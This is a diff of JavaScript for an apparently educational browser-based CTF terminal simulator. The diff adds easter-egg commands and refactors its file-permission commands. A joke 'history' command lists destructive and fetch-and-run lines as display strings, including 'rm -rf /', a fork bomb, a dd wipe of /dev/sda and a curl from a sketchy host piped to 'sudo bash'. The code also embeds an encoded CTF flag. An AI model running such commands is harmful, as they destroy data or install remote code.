+Fun fact: The real telnet towel.blinkenlights.nl plays the entire Star Wars Episode IV in ASCII art!
+
+Connection closed by foreign host.</span>`;
+        }
+        return 'telnet: could not resolve hostname';
+    },
+
+    cowthink: function (args) {
+        const message = args.length > 0 ? args.join(' ') : "Maybe I should chmod 777 everything?";
+        const border = '_'.repeat(message.length + 2);
+        return `<span class="easter-egg">
+ ${border}
+( ${message} )
+ ${'-'.repeat(message.length + 2)}
+        o   ^__^
+         o  (oo)\\_______
+            (__)\\       )\\/\\
+                ||----w |
+                ||     ||
+
+Narrator: The cow was wrong. Never chmod 777 everything.</span>`;
+    },
+
+    rev: function (args) {
+        if (args.length === 0) {
+            return 'rev: missing text to reverse';
+        }
+        const text = args.join(' ');
+        const reversed = text.split('').reverse().join('');
+        return `<span class="help-command">${reversed}
+
+Hidden message: ${text === 'terces eht dnif ot evah uoy' ? '\nYou found the secret: "you have to find the secret"' : ''}</span>`;
+    },
+
+    base64: function (args) {
+        if (args.length === 0) {
+            return `<span class="help-command">base64: encode or decode base64
+Usage: base64 [text] or base64 -d [encoded_text]
+
+Example secret: Q1RGe0IwNTNfNjRfMVNfRjROfQ==</span>`;
+        }
+
+        if (args[0] === '-d' || args[0] === '--decode') {
+            const encoded = args.slice(1).join(' ');
+            try {
+                const decoded = atob(encoded);
+                return `<span class="success">${decoded}</span>`;
+            } catch (e) {
+                return 'base64: invalid input';
+            }
+        }
+
+        const text = args.join(' ');
+        const encoded = btoa(text);
+        return `<span class="success">${encoded}</span>`;
+    },
+
+    rot13: function (args) {
+        if (args.length === 0) {
+            return `<span class="help-command">rot13: rotate text by 13 positions
+Usage: rot13 [text]
+
+Try decoding: "Pbatenghyngvbaf! Lbh sbhaq gur EBG13 frperg!"</span>`;
+        }
+
+        const text = args.join(' ');
+        const result = text.replace(/[a-zA-Z]/g, function (c) {
+            const base = c <= 'Z' ? 65 : 97;
+            return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+        });
+
+        return `<span class="success">${result}</span>`;
+    },
+
+    uptime: function () {
+        const days = 42;
+        const hours = 13;
+        const mins = 37;
+        const users = 1337;
+        const load1 = '1.33';
+        const load5 = '7.77';
+        const load15 = '13.37';
+
+        return `<span class="success"> ${new Date().toTimeString().split(' ')[0]} up ${days} days, ${hours}:${mins}, ${users} users, load average: ${load1}, ${load5}, ${load15}
+
+System has been running smoothly since the last coffee break.
+No kernel panics detected (that we're aware of).</span>`;
+    },
+
+    history: function () {
+        const fakeHistory = [
+            '1  sudo rm -rf /',
+            '2  chmod 777 everything',
+            '3  echo "password123" > passwords.txt',
+            '4  cat /dev/urandom > /dev/sda',
+            '5  mv /* /dev/null',
+            '6  wget virus.com/definitely_not_malware.sh',
+            '7  curl http://sketchy-site.ru/install.sh | sudo bash',
+            '8  dd if=/dev/zero of=/dev/sda',
+            '9  :(){ :|:& };:',
+            '10 echo "I love CTF challenges!"',
+            '11 cat flag.txt',
+            '12 history'
+        ];
+
+        return `<span class="easter-egg">Previous user's command history:
+
+${fakeHistory.join('\n')}
+
+Note: This user account has been suspended for suspicious activity.
+Just kidding! This is fake history for entertainment purposes.</span>`;
     }
 };
 
-// ========== COMANDOS PRINCIPALES (se mantienen en JS) ==========
-
+// Comandos principales
 const commands = {
     ls: function (args) {
         let showHidden = args.includes('-a') || args.includes('-la') || args.includes('-al');
@@ -668,6 +1336,7 @@ const commands = {
         }
 
         let items = Object.keys(dir).sort();
+
         if (!showHidden) {
             items = items.filter(item => !item.startsWith('.'));
         }
@@ -708,7 +1377,9 @@ const commands = {
             if (currentPath === rootPath) {
                 return '';
             }
-            newPath = getParentDirectory(currentPath);
+            const parts = currentPath.split('/').filter(p => p);
+            parts.pop();
+            newPath = '/' + parts.join('/');
         } else if (target === '.') {
             return '';
         } else if (target.startsWith('/')) {
@@ -718,7 +1389,7 @@ const commands = {
             }
             newPath = target;
         } else {
-            newPath = currentPath + (currentPath.endsWith('/') ? '' : '/') + target;
+            newPath = currentPath + '/' + target;
         }
 
         const targetDir = getDirectoryAtPath(newPath);
@@ -726,6 +1397,7 @@ const commands = {
             return `bash: cd: ${target}: No such file or directory`;
         }
 
+        // Verificar permisos en nivel 2 - MEJORADO
         if (currentLevel === 2) {
             const parts = newPath.replace(/^\/+/, '').split('/');
             const dirName = parts[parts.length - 1];
@@ -751,7 +1423,9 @@ const commands = {
         }
 
         let output = '';
+
         for (const filename of args) {
+            // Resolver ruta relativa si contiene ../
             let filePath = filename;
             let targetDir = getDirectoryAtPath(currentPath);
 
@@ -774,6 +1448,7 @@ const commands = {
                 continue;
             }
 
+            // Verificar permisos en nivel 2 - MEJORADO
             if (currentLevel === 2 && !checkPermissions(targetDir[filePath], 'read')) {
                 output += `cat: ${filename}: Permission denied\n`;
                 continue;
@@ -783,8 +1458,10 @@ const commands = {
             if (typeof content === 'string') {
                 content = content.replace(/\n+$/, '');
             }
+
             output += content;
         }
+
         return output;
     },
 
@@ -805,18 +1482,21 @@ const commands = {
             return `chmod: cannot access '${filename}': No such file or directory`;
         }
 
+        // Validar formato de permisos (octal de 3 dígitos)
         if (!/^[0-7]{3}$/.test(perms) && !/^[+-][rwx]+$/.test(perms)) {
             return `chmod: invalid mode: '${perms}'`;
         }
 
+        // Aplicar permisos
         if (/^[0-7]{3}$/.test(perms)) {
             dir[filename].permissions = perms;
         } else {
+            // Manejo básico de +x, +r, +w
             const currentPerms = dir[filename].permissions || '644';
             let newPerms = parseInt(currentPerms, 8);
 
             if (perms.includes('+x')) {
-                newPerms |= 0o111;
+                newPerms |= 0o111; // Agregar ejecución para todos
             }
 
             dir[filename].permissions = newPerms.toString(8).padStart(3, '0');
@@ -842,6 +1522,7 @@ const commands = {
             return `chown: cannot access '${filename}': No such file or directory`;
         }
 
+        // Solo permitir cambio a usuario actual (simulación)
         if (owner !== permissionsState.currentUser && owner !== 'root') {
             return `chown: invalid user: '${owner}'`;
         }
@@ -867,6 +1548,7 @@ const commands = {
             return `chgrp: cannot access '${filename}': No such file or directory`;
         }
 
+        // Permitir grupos comunes
         const validGroups = ['student', 'hackers', 'users', 'guardias', 'students'];
         if (!validGroups.includes(group)) {
             return `chgrp: invalid group: '${group}'`;
@@ -910,6 +1592,7 @@ const commands = {
             return `sort: ${filename}: Is a directory`;
         }
 
+        // Verificar permisos en nivel 2
         if (currentLevel === 2 && !checkPermissions(dir[filename], 'read')) {
             return `sort: ${filename}: Permission denied`;
         }
@@ -945,6 +1628,7 @@ const commands = {
             return `bash: ${scriptName}: Permission denied`;
         }
 
+        // Ejecutar lógica del script según el verificador
         return executeScript(scriptName, script.content, dir);
     },
 
@@ -1000,6 +1684,7 @@ Available levels:
         if (args.length === 0) {
             return 'more: missing file operand';
         }
+
         return commands.cat(args);
     },
 
@@ -1023,6 +1708,7 @@ Available levels:
             return `mkdir: cannot create directory '${dirname}': File exists`;
         }
 
+        // Aplicar umask en nivel 2
         let permissions = '755';
         if (currentLevel === 2) {
             const umask = parseInt(permissionsState.umask, 8);
@@ -1173,7 +1859,7 @@ Available levels:
         permissionsState = {
             umask: '022',
             currentUser: 'student',
-            currentGroup: 'students'
+            currentGroup: 'students'  // CORREGIDO
         };
         return '';
     },
@@ -1192,11 +1878,32 @@ Available levels:
     bsod: easterEggs.bsod,
     konami: easterEggs.konami,
     whoami: easterEggs.whoami,
-    backdoor: easterEggs.backdoor
+    backdoor: easterEggs.backdoor,
+    htop: easterEggs.htop,
+    tree: easterEggs.tree,
+    banner: easterEggs.banner,
+    telnet: easterEggs.telnet,
+    cowthink: easterEggs.cowthink,
+    rev: easterEggs.rev,
+    base64: easterEggs.base64,
+    rot13: easterEggs.rot13,
+    uptime: easterEggs.uptime,
+    history: easterEggs.history
 };
 
-// ========== FUNCIONES DE LA TERMINAL (se mantienen igual) ==========
+// Soporte para ejecutar scripts con ./
+document.addEventListener('DOMContentLoaded', function () {
+    const originalExecuteCommand = executeCommand;
+    window.executeCommand = function (input) {
+        if (input.trim().startsWith('./')) {
+            const scriptName = input.trim().substring(2);
+            return commands.bash([scriptName]);
+        }
+        return originalExecuteCommand(input);
+    };
+});
 
+// Función para manejar redirección (> y >>)
 function handleRedirection(fullCommand) {
     const redirectOutIndex = fullCommand.indexOf('>');
     const redirectAppendIndex = fullCommand.indexOf('>>');
@@ -1207,6 +1914,7 @@ function handleRedirection(fullCommand) {
 
         const output = executeCommand(commandPart, false);
 
+        // Manejar rutas relativas con ../
         let targetDir = getDirectoryAtPath(currentPath);
         let targetFile = filePart;
 
@@ -1243,6 +1951,7 @@ function handleRedirection(fullCommand) {
 
         const output = executeCommand(commandPart, false);
 
+        // Manejar rutas relativas con ../
         let targetDir = getDirectoryAtPath(currentPath);
         let targetFile = filePart;
 
@@ -1258,6 +1967,7 @@ function handleRedirection(fullCommand) {
             return 'Error: cannot access directory';
         }
 
+        // Aplicar umask en nivel 2
         let permissions = '644';
         if (currentLevel === 2) {
             const umask = parseInt(permissionsState.umask, 8);
@@ -1278,11 +1988,13 @@ function handleRedirection(fullCommand) {
     return null;
 }
 
+// Función para ejecutar comando
 function executeCommand(input, showOutput = true) {
     if (input.trim() === 'rm -rf /') {
         return easterEggs['rm -rf /']();
     }
 
+    // Manejar ./script.sh
     if (input.trim().startsWith('./')) {
         const scriptName = input.trim().substring(2);
         return commands.bash([scriptName]);
@@ -1330,68 +2042,21 @@ function executeCommand(input, showOutput = true) {
     }
 }
 
-function writeToTerminal(text, newLine = true, animated = true) {
-    let className = '';
+// Función para escribir en la terminal
+function writeToTerminal(text, newLine = true) {
     if (text.includes('cannot') || text.includes('Error') || text.includes('missing') || text.includes('No such') || text.includes('denied')) {
-        className = 'error';
+        terminal.innerHTML += `<span class="error">${text}</span>` + (newLine ? '\n' : '');
     } else if (text.includes('CTF{') || text.includes('success') || text.includes('Felicidades') || text.includes('✅')) {
-        className = 'success';
+        terminal.innerHTML += `<span class="success">${text}</span>` + (newLine ? '\n' : '');
     } else if (text.includes('💡') || text.includes('🎉') || text.includes('❌')) {
-        className = 'help-command';
-    }
-    
-    const wrappedText = className ? `<span class="${className}">${text}</span>` : text;
-    const finalText = wrappedText + (newLine ? '' : '');
-    
-    const shouldAnimate = animated && (
-        text.includes('CTF{') || 
-        text.includes('✅') || 
-        text.includes('Fragmento') ||
-        text.includes('Explicación') ||
-        text.length > 100
-    );
-    
-    if (shouldAnimate) {
-        typewriterEffect(finalText, null, 7);
+        terminal.innerHTML += `<span class="help-command">${text}</span>` + (newLine ? '\n' : '');
     } else {
-        terminal.innerHTML += finalText + (newLine ? '\n' : '');
-        terminal.scrollTop = terminal.scrollHeight;
+        terminal.innerHTML += text + (newLine ? '\n' : '');
     }
+    terminal.scrollTop = terminal.scrollHeight;
 }
 
-function typewriterEffect(text, callback, speed = 20) {
-    let i = 0;
-    const tempDiv = document.createElement('div');
-    tempDiv.style.display = 'inline';
-    terminal.appendChild(tempDiv);
-    
-    function type() {
-        if (i < text.length) {
-            const char = text.charAt(i);
-            if (char === '<') {
-                const closeTag = text.indexOf('>', i);
-                if (closeTag !== -1) {
-                    tempDiv.innerHTML += text.substring(i, closeTag + 1);
-                    i = closeTag + 1;
-                } else {
-                    tempDiv.innerHTML += char;
-                    i++;
-                }
-            } else {
-                tempDiv.innerHTML += char;
-                i++;
-            }
-            terminal.scrollTop = terminal.scrollHeight;
-            setTimeout(type, speed);
-        } else {
-            tempDiv.innerHTML += '\n';
-            if (callback) callback();
-        }
-    }
-    
-    type();
-}
-
+// Función para crear nueva línea de input
 function createInputLine() {
     const inputDiv = document.createElement('div');
     inputDiv.className = 'input-line';
@@ -1419,6 +2084,7 @@ function createInputLine() {
     return inputSpan;
 }
 
+// Función para obtener el prompt
 function getPrompt() {
     const rootPath = currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
     const shortPath = currentPath.replace(rootPath, '~');
@@ -1428,6 +2094,7 @@ function getPrompt() {
     return `<span style="color: #00ff00;">hacker@ctf-${levelIndicator}-${randomIP.replace(/\./g, '-')}</span>:${shortPath}$ `;
 }
 
+// Función para procesar comando
 function processCommand(command) {
     const output = executeCommand(command);
     if (output) {
@@ -1443,6 +2110,23 @@ function processCommand(command) {
     setupInputHandlers();
 }
 
+// Función para manejar Konami Code
+function handleKonamiCode(key) {
+    konami_sequence.push(key);
+
+    if (konami_sequence.length > KONAMI_CODE.length) {
+        konami_sequence.shift();
+    }
+
+    if (JSON.stringify(konami_sequence) === JSON.stringify(KONAMI_CODE)) {
+        writeToTerminal(easterEggs.konami());
+        konami_sequence = [];
+        currentInputElement = createInputLine();
+        setupInputHandlers();
+    }
+}
+
+// Configurar event handlers para el input
 function setupInputHandlers() {
     currentInputElement.addEventListener('keydown', function (e) {
         if (['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'KeyB', 'KeyA'].includes(e.code)) {
@@ -1556,32 +2240,15 @@ function setupInputHandlers() {
     });
 }
 
-function handleKonamiCode(key) {
-    konami_sequence.push(key);
-
-    if (konami_sequence.length > KONAMI_CODE.length) {
-        konami_sequence.shift();
-    }
-
-    if (JSON.stringify(konami_sequence) === JSON.stringify(KONAMI_CODE)) {
-        writeToTerminal(easterEggs.konami());
-        konami_sequence = [];
-        currentInputElement = createInputLine();
-        setupInputHandlers();
-    }
-}
-
+// Función para mostrar notificación de copiado
 function showCopyNotification() {
-    if (copyNotification) {
-        copyNotification.style.display = 'block';
-        setTimeout(() => {
-            copyNotification.style.display = 'none';
-        }, 2000);
-    }
+    copyNotification.style.display = 'block';
+    setTimeout(() => {
+        copyNotification.style.display = 'none';
+    }, 2000);
 }
 
-// ========== INICIALIZACIÓN ==========
-
+// Inicializar
 function init() {
     writeToTerminal('HackerOS 13.37-leet Multi-Level CTF Terminal (GNU/Linux 5.4.0-42-generic x86_64)');
     writeToTerminal('');
@@ -1597,15 +2264,13 @@ function init() {
     currentInputElement = createInputLine();
     setupInputHandlers();
 
-    if (terminal) {
-        terminal.addEventListener('mouseup', function () {
-            const selection = window.getSelection();
-            if (selection.toString().length > 0) {
-                document.execCommand('copy');
-                showCopyNotification();
-            }
-        });
-    }
+    terminal.addEventListener('mouseup', function () {
+        const selection = window.getSelection();
+        if (selection.toString().length > 0) {
+            document.execCommand('copy');
+            showCopyNotification();
+        }
+    });
 
     document.addEventListener('keydown', function (e) {
         if (e.ctrlKey && e.key === 'c') {
@@ -1627,8 +2292,4 @@ document.addEventListener('click', function () {
 });
 
 // Inicializar cuando la página carga
-window.addEventListener('load', async function() {
-    // Cargar filesystem primero, luego inicializar
-    await loadFilesystem();
-    init();
-});
+window.addEventListener('load', init);
